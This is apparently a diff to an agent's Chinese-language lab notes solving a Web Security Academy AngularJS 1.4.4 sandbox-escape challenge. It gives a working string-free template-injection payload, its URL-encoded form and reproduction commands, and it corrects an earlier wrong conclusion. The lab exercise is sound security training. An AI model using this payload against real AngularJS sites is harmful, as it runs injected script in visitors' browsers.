@@ -6,40 +6,41 @@ title: lab-angular-sandbox-escape-without-strings
 
 > evidences: [[client-side-template-injection-family]]
 
-- 题面:逃逸 AngularJS 沙箱执行 `alert`,不可用 `$eval`、不可用字符串。
-- 实例(批48):https://0aaa00fc03b8daa880250336000a0035.web-security-academy.net
-- 状态:**stuck**(墙从"沙箱检查"移到了"override 之后 getter 本身是坏的")
+- 题面:AngularJS 1.4.4,`$eval` 不可用、不能用字符串;逃逸沙箱执行 `alert`。
+- 实例(批49):https://0ad700ab046bab1f806a2625000f0000.web-security-academy.net
+- 判定:**solved** — 横幅 `<h4>Congratulations, you solved the lab!</h4>`(`banner_verdict.solved=true`)
 
-## 机制(生成代码)
+## 服务端生成形(实测)
 
-`var key='<参数名>'; $scope.query[key]='<值>'; $scope.value = $parse(key)($scope.query);` —— 参数名 = 表达式,scope = `$scope.query`。
+每个 query 参数各生成一段(顺序 = Java HashMap):
 
-## 新证据(`page_eval_batch` 页内批量分桶)
+```js
+var key = '<参数名>'; $scope.query[key] = '<参数值>'; $scope.value = $parse(key)($scope.query);
+```
 
-harness:`--prelude 'try{window.P=angular.element(document.body).injector().get("$parse")}catch(e){P=null} window.S={a:"alert(1)",b:"pw12345678"}; window.alert=<hook>'`,候选写成纯 JS 表达式 `P('EXPR')(S)`。
+⇒ **参数名**就是被 `$parse` 的表达式,原样插入单引号字符串(不转义,含 `'` 会破串);`search` 必须存在才生成循环;值被 HTML 转义,所以只有名字可用。
 
-1. **可用的 override 形式**:`P('a.constructor.prototype.charAt=[].join')(S)` → 值:function;随后 `String(String.prototype.charAt)` → `function join() { [native code] }` ✓。
-   注意 `toString.constructor.prototype.charAt=[].join` 会 **Uncaught**(`Object.prototype.toString.constructor` = Function → 被拦);必须用**字符串型 scope 属性**取到 String。
-2. **override 之后新编译的 getter 是坏的(量化)**:
-   - `P('1+1')(S)` → 桶 value:number 但值为 **NaN**(JSON 里序列化成 null)⇒ **连算术都被破坏**;
-   - `P('a')(S)` → `"alert(1)"`(标识符读取仍正常);
-   - `P('constructor.constructor(a)()')(S)` → **undefined,无异常、无执行**(静默 no-op);同一表达式在**未** override 时是 Uncaught。
-3. **原语在裸 JS 里可用**(排除"Function 被 CSP 禁"的解释):
-   `Function('window.__fired=99')()` → 99;`S.constructor.constructor('window.__fired=98')()` → 98;而任何经 `$parse` 的等价式都不执行。
+## 解法载荷(单条 $parse 内完成)
 
-⇒ 结论:override 确实废掉了 isIdent 重写与 isecobj 抛错,但**产出的取数函数同时被 charAt 污染成错的**(算术 NaN / 调用静默丢失),所以"先 override 再跑执行式"这条路不是被检查拦住,而是被**编译器自身**拦住。
+```
+?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
 
-## 未决面
+- `fromCharCode(120,61,97,108,101,114,116,40,49,41)` = `x=alert(1)`(全程无字符串字面量);
+- `orderBy` 的字符串谓词在**运行时**才被 `$parse`,以每个元素为 scope 求值 ⇒ 在 charAt override **之后**仍能编译并执行;
+- 参数名里 `=` 必须发 `%3D`,否则被 query 解析器切开。URL 编码名:
+  `toString().constructor.prototype.charAt%3D%5B%5D.join%3B%5B1%5D%7CorderBy%3AtoString().constructor.fromCharCode%28120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29`
 
-- 要找的是"**其生成 getter 不经过被污染的 charAt 路径**"的表达式,或一条**无需 override** 就能过 ensureSafe 的执行式(scope 值可当无引号字符串源,参数名里 `[ ] | ;` 放行)。
-- 下一步:把候选式扩到 `P('EXPR')(S)` 的更大枚举(算术/成员/调用/字面量四类对照),用 `1+1` 是否 NaN 当"该次 parse 是否被污染"的**探针**,二分出哪些语法节点安全。
+## 推翻批48 结论
+
+批48 用 `page_eval_batch` 把 override 与载荷拆成**两次** `$parse` 调用,观察到 `P('1+1')` → NaN、`P('constructor.constructor(a)()')` → 静默 no-op,据此判「先 override 再跑执行式」整条路死。**该否证作废**:把 override 与载荷写进**同一条表达式**(override 作第一条语句,`[1]|orderBy:…` 作第二条)后 `alert(1)` 真实触发(`page_alert` → `fired=true, alerts:["alert:1"]`)。拆开调用的探针测的不是 lab 的真实编译路径。
 
 ## 复现命令
 
 ```
-range_launch launch D82E3A0C…C05390F1 --jar ~/.pi-rs/agent/chrome-jar.json
-page_eval_batch "https://<inst>/?search=1" --file /tmp/cands.txt --ws ws://127.0.0.1:9333 \
-  --prelude 'try{window.P=angular.element(document.body).injector().get("$parse")}catch(e){P=null} window.__fired=0;window.alert=function(){window.__fired++};window.S={a:"alert(1)"};'
+range_launch launch d82e3a0ca07b096a36c320bdaf6f10ac92869a49f98d1adfd16b4ffdc05390f1 --jar ~/.pi-rs/agent/chrome-jar.json
+page_alert 'https://<inst>/?search=1&toString().constructor.prototype.charAt%3D%5B%5D.join%3B%5B1%5D%7CorderBy%3AtoString().constructor.fromCharCode%28120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29=1'
+banner_verdict 'https://<inst>/'
 ```
 
 ## 关系
